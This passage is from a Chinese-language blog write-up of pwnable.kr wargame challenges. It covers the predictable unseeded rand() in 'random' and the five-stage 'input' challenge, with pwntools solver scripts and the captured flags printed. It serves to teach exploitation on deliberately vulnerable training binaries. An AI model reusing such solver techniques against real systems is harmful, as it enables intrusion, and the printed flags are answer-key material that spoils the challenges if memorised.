class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> key=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;key);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( (key ^ random) == <span class="number">0xdeadbeef</span> ){</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Good!\n"</span>);</span><br><span class="line">        system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Wrong, maybe you should try 2^32 cases.\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
</div>

<p>
获得flag的要求是我输入的key和random异或起来的值等于 0xdeadbeef
</p>

<p>
Google一下得知rand()在先前没有调用srand(seed)时, 会初始化随机数种子为1
</p>

<p>
那直接写个程序算一算rand()^0xdeadbeef是多少就行了
</p>

<div class="org-src-container">

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span><br><span class="line"></span>{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, rand() ^ <span class="number">0xdeadbeef</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
</div>

<p>
结果是 -1255736440
</p>

<p>
运行, 输入, GET FLAG!
</p>

<p>
flag为 <code>Mommy, I thought libc random is unpredictable...</code>
</p>
</div>
</div>
</div>
<div id="outline-container-sec-7" class="outline-2">
<h2 id="sec-7">input</h2>
<div class="outline-text-2" id="text-7">
</div><div id="outline-container-sec-7-1" class="outline-3">
<h3 id="sec-7-1">简介</h3>
<div class="outline-text-3" id="text-7-1">
<pre class="example">
Mom? how can I pass my input to a computer program?

ssh input2@pwnable.kr -p2222 (pw:guest)
</pre>
</div>
</div>

<div id="outline-container-sec-7-2" class="outline-3">
<h3 id="sec-7-2">分析</h3>
<div class="outline-text-3" id="text-7-2">
<div class="org-src-container">

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Welcome to pwnable.kr\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Let's see if you know how to give input to program\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Just give me correct inputs then you will get the flag :)\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// argv</span></span><br><span class="line">    <span class="keyword">if</span>(argc != <span class="number">100</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">'A'</span>],<span class="string">"\x00"</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">'B'</span>],<span class="string">"\x20\x0a\x0d"</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Stage 1 clear!\n"</span>); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// stdio</span></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">4</span>];</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">"\x00\x0a\x00\xff"</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    read(<span class="number">2</span>, buf, <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">"\x00\x0a\x02\xff"</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Stage 2 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// env</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="string">"\xca\xfe\xba\xbe"</span>, getenv(<span class="string">"\xde\xad\xbe\xef"</span>))) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Stage 3 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// file</span></span><br><span class="line">    FILE* fp = fopen(<span class="string">"\x0a"</span>, <span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!fp) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>( fread(buf, <span class="number">4</span>, <span class="number">1</span>, fp)!=<span class="number">1</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>( <span class="built_in">memcmp</span>(buf, <span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>) ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Stage 4 clear!\n"</span>); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// network</span></span><br><span class="line">    <span class="keyword">int</span> sd, cd;</span><br><span class="line">    <span class="keyword">struct</span> sockaddr_in saddr, caddr;</span><br><span class="line">    sd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(sd == -<span class="number">1</span>){</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"socket error, tell admin\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line">    saddr.sin_family = AF_INET;</span><br><span class="line">    saddr.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">    saddr.sin_port = htons( atoi(argv[<span class="string">'C'</span>]) );</span><br><span class="line">    <span class="keyword">if</span>(bind(sd, (<span class="keyword">struct</span> sockaddr*)&amp;saddr, <span class="keyword">sizeof</span>(saddr)) &lt; <span class="number">0</span>){</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"bind error, use another port\n"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">    listen(sd, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> c = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in);</span><br><span class="line">    cd = accept(sd, (<span class="keyword">struct</span> sockaddr *)&amp;caddr, (<span class="keyword">socklen_t</span>*)&amp;c);</span><br><span class="line">    <span class="keyword">if</span>(cd &lt; <span class="number">0</span>){</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"accept error, tell admin\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span>( recv(cd, buf, <span class="number">4</span>, <span class="number">0</span>) != <span class="number">4</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">"\xde\xad\xbe\xef"</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Stage 5 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// here's your flag</span></span><br><span class="line">    system(<span class="string">"/bin/cat flag"</span>);    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
</div>

<p>
题目有五关, 一个个分析吧
</p>
</div>

<div id="outline-container-sec-7-2-1" class="outline-4">
<h4 id="sec-7-2-1">第一关</h4>
<div class="outline-text-4" id="text-7-2-1">
<div class="org-src-container">

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// argv</span></span><br><span class="line"><span class="keyword">if</span>(argc != <span class="number">100</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">'A'</span>],<span class="string">"\x00"</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">'B'</span>],<span class="string">"\x20\x0a\x0d"</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Stage 1 clear!\n"</span>);</span><br></pre></td></tr></table></figure>
</div>

<p>
通过要求: 要有100个参数, 其中第'A'个为"\x00", 第'B'个为"\x20\x0a\x0d"
</p>


<p>
一开始尝试用shell传递, <code>./input $(python -c "xxx")</code> 这种,
</p>

<p>
无果, 于是试着直接用Python, 但是因惯性思维影响在Python中还是继续传"\x00"
</p>

<p>
忘记了空字符串末尾就有一个'\x00'了
</p>

<p>
解题脚本如下
</p>

<div class="org-src-container">

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process([<span class="string">'./test'</span>, *[<span class="string">'a'</span>] * <span class="number">64</span>, <span class="string">''</span>, <span class="string">'\x20\x0a\x0d'</span>, *[<span class="string">'a'</span>] * <span class="number">33</span>])</span><br><span class="line"></span><br><span class="line">print(io.recv())</span><br><span class="line"></span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure>
</div>
</div>
</div>

<div id="outline-container-sec-7-2-2" class="outline-4">
<h4 id="sec-7-2-2">第二关</h4>
<div class="outline-text-4" id="text-7-2-2">
<div class="org-src-container">

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// stdio</span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">4</span>];</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">"\x00\x0a\x00\xff"</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">read(<span class="number">2</span>, buf, <span class="number">4</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">"\x00\x0a\x02\xff"</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Stage 2 clear!\n"</span>);</span><br></pre></td></tr></table></figure>
</div>

<p>
分别从stdin和stderr读取四个字符
</p>

<p>
要求分别是"\x00\x0a\x00\xff"和"\x00\x0a\x02\xff"
</p>

<p>
试了一下直接io.sendline()
果不其然地失败了, NUL是个不好处理的玩意儿啊
</p>

<p>
Google得知这个地方要用著名的IO重定向
</p>

<p>
C语言代码太复杂了, 还是想用Python
</p>

<p>
Google了一下还是找到了做法, 不过很迷为什么StringIO/BytesIO不行呢,
会提示 <code>io.UnsupportedOperation: not writable</code>
</p>

<p>
创建临时文件总是感觉不是很干净
</p>

<div class="org-src-container">

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">'stdin.txt'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">b'\x00\x0a\x00\xff'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'stderr.txt'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">b'\x00\x0a\x02\xff'</span>)</span><br><span class="line"></span><br><span class="line">stdin  = open(<span class="string">'stdin.txt'</span>, <span class="string">'rb'</span>)</span><br><span class="line">stderr = open(<span class="string">'stderr.txt'</span>, <span class="string">'rb'</span>)</span><br><span class="line"></span><br><span class="line">io = process([<span class="string">'./test'</span>, *[<span class="string">'a'</span>] * <span class="number">64</span>, <span class="string">''</span>, <span class="string">'\x20\x0a\x0d'</span>, *[<span class="string">'a'</span>] * <span class="number">33</span>], stdin=stdin, stderr=stderr)</span><br><span class="line"></span><br><span class="line">print(io.recv())</span><br></pre></td></tr></table></figure>
</div>
</div>
</div>

<div id="outline-container-sec-7-2-3" class="outline-4">
<h4 id="sec-7-2-3">第三关</h4>
<div class="outline-text-4" id="text-7-2-3">
<div class="org-src-container">

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// env</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="string">"\xca\xfe\xba\xbe"</span>, getenv(<span class="string">"\xde\xad\xbe\xef"</span>))) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Stage 3 clear!\n"</span>);</span><br></pre></td></tr></table></figure>
</div>

<p>
第三关要求环境变量"\xde\xad\xbe\xef"的值为"\xca\xfe\xba\xbe"
</p>

<p>
process的env参数可以指定环境变量, 这关不难
</p>

<div class="org-src-container">

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">env = {</span><br><span class="line">    <span class="string">b'\xde\xad\xbe\xef'</span>: <span class="string">b'\xca\xfe\xba\xbe'</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">io = process([<span class="string">'./test'</span>, *[<span class="string">'a'</span>] * <span class="number">64</span>, <span class="string">''</span>, <span class="string">'\x20\x0a\x0d'</span>, *[<span class="string">'a'</span>] * <span class="number">33</span>], env=env, stdin=stdin, stderr=stderr)</span><br></pre></td></tr></table></figure>
</div>
</div>
</div>

<div id="outline-container-sec-7-2-4" class="outline-4">
<h4 id="sec-7-2-4">第四关</h4>
<div class="outline-text-4" id="text-7-2-4">
<div class="org-src-container">

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">FILE* fp = fopen(<span class="string">"\x0a"</span>, <span class="string">"r"</span>);</span><br><span class="line"><span class="keyword">if</span>(!fp) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>( fread(buf, <span class="number">4</span>, <span class="number">1</span>, fp)!=<span class="number">1</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>( <span class="built_in">memcmp</span>(buf, <span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>) ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">fclose(fp);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Stage 4 clear!\n"</span>);</span><br></pre></td></tr></table></figure>
</div>

<p>
第四关, 以只读模式打开"\x0a"文件,
读取四个字节, 要求是四个NUL
</p>

<p>
直接建个文件就行了
</p>

<div class="org-src-container">

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">'\x0a'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">b'\x00\x00\x00\x00'</span>)</span><br></pre></td></tr></table></figure>
</div>
</div>
</div>
<div id="outline-container-sec-7-2-5" class="outline-4">
<h4 id="sec-7-2-5">第五关</h4>
<div class="outline-text-4" id="text-7-2-5">
<div class="org-src-container">

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// network</span></span><br><span class="line"><span class="keyword">int</span> sd, cd;</span><br><span class="line"><span class="keyword">struct</span> sockaddr_in saddr, caddr;</span><br><span class="line">sd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(sd == -<span class="number">1</span>){</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"socket error, tell admin\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line">saddr.sin_family = AF_INET;</span><br><span class="line">saddr.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">saddr.sin_port = htons( atoi(argv[<span class="string">'C'</span>]) );</span><br><span class="line"><span class="keyword">if</span>(bind(sd, (<span class="keyword">struct</span> sockaddr*)&amp;saddr, <span class="keyword">sizeof</span>(saddr)) &lt; <span class="number">0</span>){</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"bind error, use another port\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">}</span><br><span class="line">listen(sd, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">int</span> c = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in);</span><br><span class="line">cd = accept(sd, (<span class="keyword">struct</span> sockaddr *)&amp;caddr, (<span class="keyword">socklen_t</span>*)&amp;c);</span><br><span class="line"><span class="keyword">if</span>(cd &lt; <span class="number">0</span>){</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"accept error, tell admin\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span>( recv(cd, buf, <span class="number">4</span>, <span class="number">0</span>) != <span class="number">4</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">"\xde\xad\xbe\xef"</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Stage 5 clear!\n"</span>);</span><br></pre></td></tr></table></figure>
</div>

<p>
一脸懵逼
</p>

<p>
查了下大概就是监听了argv['C']所表示的端口, 直接用remote连接就可以发送数据了
</p>

<div class="org-src-container">

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">io = process([<span class="string">'./test'</span>, *[<span class="string">'a'</span>] * <span class="number">64</span>, <span class="string">''</span>, <span class="string">'\x20\x0a\x0d'</span>, <span class="string">'23233'</span>, *[<span class="string">'a'</span>] * <span class="number">32</span>], env=env, stdin=stdin, stderr=stderr)</span><br><span class="line"></span><br><span class="line">net = remote(<span class="string">'127.0.0.1'</span>, <span class="number">23233</span>)</span><br><span class="line">net.send(<span class="string">b'\xde\xad\xbe\xef'</span>)</span><br><span class="line">net.close()</span><br></pre></td></tr></table></figure>
</div>

<p>
在写这关的时候, 我发现了几件比较悲剧的事情
</p>

<ul class="org-ul">
<li>我用的是Python3
</li>
<li>我在题目服务器上没有权限在当前创建文件
</li>
</ul>

<p>
第一点改一改process第一个参数的生成方式, 不要用Python3的*就行了
</p>

<p>
第二点可以将CWD设置为/tmp/, /tmp/下我拥有创建文件的权限,
不过需要注意这样就必须将input路径写全
<a href="https://stackoverflow.com/questions/15725273/python-oserror-errno-2-no-such-file-or-directory" target="_blank" rel="noopener">python-oserror-errno-2-no-such-file-or-directory</a>
</p>

<p>
然而又发现虽然这样五关都过了, 但是身在/tmp/目录的process读不到/homt/input2下的flag文件&#x2026;
</p>

<p>
试着建立了symbolic link, 但还是读不到
</p>

<p>
后来去吃饭电脑休眠, 回来后重连ssh的时候发现了这么一段话
</p>
<blockquote>
<p>
files under /tmp can be erased anytime. make your directory under /tmp
</p>
</blockquote>

<p>
然后在/tmp下创建新目录, 再cd <code>ln -s /home/input2/flag flag</code>
可算成功了
</p>
</div>
</div>

<div id="outline-container-sec-7-2-6" class="outline-4">
<h4 id="sec-7-2-6">最终代码</h4>
<div class="outline-text-4" id="text-7-2-6">
<div class="org-src-container">

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">'/tmp/zhonghua'</span>):</span><br><span class="line">    os.mkdir(<span class="string">'/tmp/zhonghua'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">'MANJARO'</span> <span class="keyword">in</span> platform.platform():</span><br><span class="line">    pwd = <span class="string">'/home/zhonghua/writeup/pwnable.kr/'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    pwd = <span class="string">'/home/input2/'</span></span><br><span class="line"></span><br><span class="line">port = randint(<span class="number">10000</span>, <span class="number">65535</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'/tmp/zhonghua/stdin.txt'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">b'\x00\x0a\x00\xff'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'/tmp/zhonghua/stderr.txt'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">b'\x00\x0a\x02\xff'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'/tmp/zhonghua/\x0a'</span>, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">b'\x00\x00\x00\x00'</span>)</span><br><span class="line"></span><br><span class="line">stdin  = open(<span class="string">'/tmp/zhonghua/stdin.txt'</span>, <span class="string">'r'</span>)</span><br><span class="line">stderr = open(<span class="string">'/tmp/zhonghua/stderr.txt'</span>, <span class="string">'r'</span>)</span><br><span class="line"></span><br><span class="line">env = {</span><br><span class="line">    <span class="string">b'\xde\xad\xbe\xef'</span>: <span class="string">b'\xca\xfe\xba\xbe'</span>,</span><br><span class="line">    <span class="string">'PWD'</span>: pwd</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">arg = [pwd + <span class="string">'input'</span>] + [<span class="string">'a'</span>] * <span class="number">64</span> + [<span class="string">''</span>, <span class="string">'\x20\x0a\x0d'</span>, str(port)] + [<span class="string">'a'</span>] * <span class="number">32</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面的代码不兼容python2.....</span></span><br><span class="line"><span class="comment"># io = process(['./test', *['a'] * 64, '', '\x20\x0a\x0d', '23233', *['a'] * 32], env=env, stdin=stdin, stderr=stderr)</span></span><br><span class="line">io = process(arg, cwd=<span class="string">'/tmp/zhonghua/'</span>, env=env, stdin=stdin, stderr=stderr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 先等它准备好...</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">net = remote(<span class="string">'localhost'</span>, port)</span><br><span class="line">net.send(<span class="string">b'\xde\xad\xbe\xef'</span>)</span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line">print(io.recv().decode())</span><br><span class="line"></span><br><span class="line">net.close()</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure>
</div>

<p>
flag为 <code>Mommy! I learned how to pass various input in Linux :)</code>
</p>

<p>
<del>到头来其实根本没比C语言简单</del>
</p>
</div>
</div>
</div>
</div>

<div id="outline-container-sec-8" class="outline-2">
<h2 id="sec-8">leg</h2>
<div class="outline-text-2" id="text-8">
</div><div id="outline-container-sec-8-1" class="outline-3">
<h3 id="sec-8-1">简介</h3>
<div class="outline-text-3" id="text-8-1">
<pre class="example">
Daddy told me I should study arm.
But I prefer to study my leg!

Download : http://pwnable.kr/bin/leg.c
Download : http://pwnable.kr/bin/leg.asm

ssh leg@pwnable.kr -p2222 (pw:guest)
</pre>

<p>
看不懂看不懂, 这是什么俚语吗
</p>
</div>
</div>

